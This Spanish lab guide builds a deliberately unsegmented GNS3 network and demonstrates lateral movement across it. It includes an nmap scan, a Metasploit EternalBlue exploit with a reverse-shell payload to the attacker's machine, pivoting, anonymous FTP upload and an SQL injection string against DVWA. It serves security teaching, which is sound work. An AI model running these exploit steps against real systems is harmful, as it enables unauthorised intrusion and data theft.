@@ -1,0 +1,244 @@
+CASO 1: EMPRESA SIN SEGMENTACIÓN DE RED
+"La Red Plana S.A.S."
+1. DESCRIPCIÓN GENERAL (Recordatorio)
+Es una pequeña empresa que tiene todos sus dispositivos en la misma red: servidores, computadoras de empleados, impresoras y hasta el WiFi de invitados. No hay separación entre áreas (por ejemplo, no hay una DMZ para servidores públicos ni una red interna protegida). Esto es una mala práctica gravísima porque si un atacante logra acceder a un punto de la red, puede moverse libremente a cualquier otro dispositivo.
+
+2. OBJETIVO DEL CASO
+Demostrar que, en una red plana:
+
+Un punto débil (como un Windows XP sin parches o un WiFi sin aislamiento) compromete toda la organización.
+
+No hay barreras internas: el atacante puede saltar de la impresora al servidor web sin dificultad.
+
+La falta de segmentación hace que el perímetro de seguridad sea inexistente.
+
+3. CONFIGURACIÓN DETALLADA DEL ESCENARIO EN GNS3
+Vamos a construir la siguiente topología:
+
+text
+[Kali Linux] --- (switch) --- [Windows XP]
+                        |
+                        +--- [Ubuntu Server (DVWA)]
+                        |
+                        +--- [Impresora simulada]
+                        |
+                        +--- [Punto de acceso WiFi] --- [Cliente WiFi (TinyCore)]
+Todas las máquinas están en la misma subred: 192.168.1.0/24.
+
+Máquinas necesarias:
+Máquina	Sistema	Rol	IP (estática recomendada)
+Atacante	Kali Linux	Red Team	192.168.1.100
+Víctima 1	Windows XP (sin parches)	Recepcionista	192.168.1.10
+Víctima 2	Ubuntu Server 20.04	Servidor web (tienda online)	192.168.1.20
+Víctima 3	Impresora (simulada con Linux)	Impresora de red	192.168.1.30
+Cliente WiFi	TinyCore Linux	Invitado o empleado en WiFi	192.168.1.200 (vía DHCP)
+Detalles de cada máquina:
+a) Kali Linux (atacante):
+
+Herramientas preinstaladas: nmap, Metasploit, hydra, etc.
+
+Se conecta al switch mediante una interfaz Ethernet.
+
+b) Windows XP (sin parches):
+
+Necesitas una imagen de Windows XP SP2 o SP3 (sin actualizaciones de seguridad).
+
+Activar el firewall de Windows (aunque sea débil, para tener algo que evadir).
+
+Compartir una carpeta sencilla (simula documentos de la recepcionista).
+
+Habilitar el escritorio remoto (RDP) en puerto 3389.
+
+Asegurarse de que el servicio SMB (puerto 445) esté activo.
+
+c) Ubuntu Server (servidor web):
+
+Instalar Apache, MySQL, PHP.
+
+Instalar DVWA (Damn Vulnerable Web Application) en el directorio web.
+
+Configurar DVWA en modo "low" (baja seguridad) para que sea fácilmente atacable.
+
+Asegurar que el puerto 80 sea accesible desde cualquier máquina de la red.
+
+d) Impresora simulada:
+
+Puedes usar una máquina Linux mínima (Debian o Ubuntu server) con un servicio HTTP básico simulando la interfaz web de una impresora.
+
+Instalar vsftpd o algún servicio FTP para simular el puerto 21 abierto (las impresoras suelen tener FTP para escaneo a red).
+
+Crear una página web sencilla que diga "Impresora HP LaserJet – Interfaz de administración" y que tenga un formulario de login falso (no importa que funcione, solo es para que el atacante la vea).
+
+e) Punto de acceso WiFi simulado:
+
+En GNS3 no tenemos WiFi real, pero podemos simularlo creando un switch adicional y conectando un "cliente WiFi" a ese switch.
+
+Ese switch se conecta al switch principal sin ningún tipo de aislamiento (como si fuera un AP sin segregación de clientes).
+
+El cliente WiFi puede ser TinyCore Linux (muy ligero) con una interfaz de red conectada a ese switch.
+
+4. PASOS PARA MONTAR EL ESCENARIO EN GNS3
+Paso 1: Crear el proyecto en GNS3.
+
+Abre GNS3, crea un nuevo proyecto llamado "Caso1_RedPlana".
+
+Asegúrate de tener integración con VirtualBox (para poder usar las máquinas virtuales).
+
+Paso 2: Importar las máquinas virtuales a GNS3.
+
+Desde VirtualBox, tener las VMs creadas: Kali, Windows XP, Ubuntu Server, TinyCore, y la impresora simulada.
+
+En GNS3, ve a "Edit" -> "Preferences" -> "VirtualBox" y añade cada una de esas VMs.
+
+Paso 3: Arrastrar los dispositivos al área de trabajo.
+
+Un switch Ethernet de GNS3 (el básico, no necesita configuración).
+
+Las 5 máquinas.
+
+Conecta cada máquina al switch con cables Ethernet.
+
+Paso 4: Configurar las IPs estáticas.
+
+Enciende cada máquina (botón derecho -> Start).
+
+Configura las direcciones IP manualmente según la tabla anterior.
+
+En Windows XP: Panel de control -> Conexiones de red -> Propiedades de TCP/IP -> Usar la siguiente IP.
+
+En Ubuntu: editar /etc/netplan/00-installer-config.yaml o usar ifconfig temporal.
+
+En Kali: similar.
+
+Paso 5: Verificar conectividad.
+
+Desde Kali, haz ping a las demás direcciones IP. Todas deben responder.
+
+Desde Windows XP, navega a http://192.168.1.20 (debe aparecer DVWA).
+
+Desde Kali, intenta acceder a la impresora simulada: http://192.168.1.30 (debe verse la página falsa).
+
+Paso 6: Preparar los servicios vulnerables.
+
+En Ubuntu, verifica que DVWA funciona y que el nivel de seguridad está en "low".
+
+En Windows XP, asegúrate de que el firewall permite conexiones entrantes en los puertos que vamos a atacar (o desactívalo directamente para facilitar el caso).
+
+En la impresora simulada, deja el FTP anónimo habilitado (por ejemplo, en vsftpd, permitir anonymous).
+
+5. ATAQUE PASO A PASO (DESDE KALI)
+Vamos a ejecutar un ataque realista que demuestre el peligro de la red plana.
+
+Fase 1: Reconocimiento (Escaneo de red)
+
+Desde la terminal de Kali:
+
+bash
+nmap -sV -O 192.168.1.0/24
+Explicación: -sV detecta versiones de servicios, -O intenta detectar el sistema operativo. Esto revelará todas las máquinas y sus puertos abiertos.
+
+Resultado esperado:
+
+Windows XP: puertos 135, 139, 445 (SMB), 3389 (RDP).
+
+Ubuntu: puertos 80 (HTTP), 22 (SSH), 3306 (MySQL) quizás.
+
+Impresora: puertos 21 (FTP), 80 (HTTP), 23 (Telnet) si lo configuraste.
+
+TinyCore: puertos probablemente ninguno, pero se verá como host activo.
+
+Evidencia a capturar: Guardar la salida de nmap en un archivo: nmap -sV -O 192.168.1.0/24 -oN escaneo_inicial.txt
+
+Fase 2: Explotación del punto débil (Windows XP)
+
+Sabemos que Windows XP sin parches es vulnerable a EternalBlue (MS17-010). Vamos a usar Metasploit.
+
+bash
+msfconsole
+Dentro de Metasploit:
+
+text
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100   (IP de Kali)
+set LPORT 4444
+exploit
+Si todo va bien, obtendrás una sesión Meterpreter en Windows XP. Esto significa que tienes control total de esa máquina.
+
+Evidencia a capturar: Captura de pantalla del momento en que se obtiene la sesión. También puedes ejecutar comandos como sysinfo y getuid para mostrar privilegios.
+
+Fase 3: Movimiento lateral hacia la impresora
+
+Desde la sesión Meterpreter en Windows XP, ahora podemos usar esa máquina como pivote para atacar otros dispositivos en la misma red.
+
+Primero, agregamos una ruta en Metasploit para enrutar tráfico a través de la sesión:
+
+text
+run autoroute -s 192.168.1.0/24
+background   (deja la sesión en segundo plano)
+Ahora escaneamos la red desde la perspectiva de Windows XP (para ver qué alcanza):
+
+text
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.30
+set PORTS 21,80,23
+run
+Veremos que la impresora tiene esos puertos abiertos. Intentamos acceder al FTP anónimo:
+
+text
+ftp 192.168.1.30
+Usuario: anonymous, contraseña: (vacío). Si funciona, podemos subir un archivo (por ejemplo, un archivo de texto con un mensaje de advertencia simulado).
+
+Evidencia a capturar: Captura de la conexión FTP exitosa y subida de archivo.
+
+Fase 4: Ataque al servidor web (Ubuntu con DVWA)
+
+Ahora desde la sesión de Windows XP (o directamente desde Kali, ya que la red es plana), atacamos el servidor web.
+
+Desde Kali (o desde la sesión Meterpreter si prefieres mantener el pivote), abre el navegador y accede a http://192.168.1.20/dvwa.
+
+Realiza un ataque de inyección SQL simple en DVWA (nivel low):
+
+Ve a "SQL Injection".
+
+En el campo "User ID", ingresa: ' OR '1'='1' -- -
+
+Esto debería devolver todos los usuarios de la base de datos.
+
+Evidencia a capturar: Captura de pantalla del resultado de la inyección SQL.
+
+También puedes intentar subir una webshell si DVWA tiene la opción de "File Upload" habilitada.
+
+Fase 5: Movimiento hacia el cliente WiFi
+
+El cliente WiFi (TinyCore) no tiene servicios vulnerables, pero podemos comprobar que es accesible. Por ejemplo, desde Kali, hacer ping a 192.168.1.200. Si responde, significa que la red WiFi no está aislada.
+
+Esto demuestra que un atacante que se conecte al WiFi de invitados puede llegar a toda la red interna.
+
+6. EVIDENCIAS A CAPTURAR (PARA DOCUMENTACIÓN)
+Para cada paso, debes guardar:
+
+Salida de nmap (archivo .txt).
+
+Captura de pantalla de la sesión Meterpreter (mostrando sysinfo).
+
+Captura de pantalla de la conexión FTP anónima y subida de archivo.
+
+Captura de pantalla de la inyección SQL en DVWA.
+
+Captura de tráfico de red con Wireshark durante el ataque (opcional pero muy valioso). Puedes filtrar por la IP de Kali o de Windows XP para ver los paquetes SMB, FTP, HTTP.
+
+Notas de los comandos utilizados (puedes guardar el historial de Metasploit con makerc).
+
+7. LECCIONES APRENDIDAS (PARA EL INFORME)
+Una red plana permite que cualquier dispositivo sea un punto de entrada a toda la organización.
+
+Windows XP (o cualquier sistema sin parches) es un riesgo crítico.
+
+La segmentación de red (DMZ, VLANs) habría contenido el ataque: el servidor web no debería estar en la misma red que los equipos de oficina.
+
+El WiFi de invitados debe estar aislado de la red interna.
+
+Las impresoras y otros dispositivos IoT suelen ser olvidados en seguridad y pueden ser puerta de entrada.
